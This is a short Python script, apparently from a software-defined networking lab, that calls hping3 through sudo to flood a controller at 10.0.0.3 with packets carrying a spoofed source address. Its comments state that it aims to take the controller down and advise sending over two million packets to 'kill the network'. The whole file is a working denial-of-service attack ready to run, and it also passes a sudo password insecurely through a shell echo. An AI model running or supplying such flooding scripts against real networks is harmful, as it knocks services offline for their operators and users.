import os

# This script will flood the controller with packages and the controller will be down
# Use over 2000000 packages to kill the network
packages = "2000"
data_size = "120"
sourc_ip = "10.0.0.42"
dest_ip = "10.0.0.3"
sudoPassword = ''

os.system('echo %s|sudo -S %s' % (
sudoPassword, "hping3 --faster -c " + packages + " -p 7 " + "-d " + data_size + " -a " + sourc_ip + " " + dest_ip))
